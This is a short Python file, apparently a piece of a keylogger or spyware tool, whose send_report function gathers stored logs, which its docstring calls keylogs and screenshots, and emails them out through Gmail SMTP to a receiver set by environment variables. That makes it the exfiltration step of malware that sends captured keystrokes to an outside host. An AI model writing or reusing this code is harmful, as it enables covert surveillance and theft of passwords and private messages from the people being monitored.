import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import db
import os

def send_report():
    """Send email report with keylogs and screenshots."""
    sender = os.getenv("SENDER_EMAIL")
    password = os.getenv("SENDER_PASSWORD")
    receiver = os.getenv("RECEIVER_EMAIL")

    msg = MIMEMultipart()
    msg["From"] = sender
    msg["To"] = receiver
    msg["Subject"] = "Monitoring Report"

    logs = db.get_logs()
    body = "\n".join(logs)

    msg.attach(MIMEText(body, "plain"))

    # Send email
    try:
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(sender, password)
            server.send_message(msg)
        print("Report sent successfully.")
    except Exception as e:
        print(f"Failed to send email: {e}")
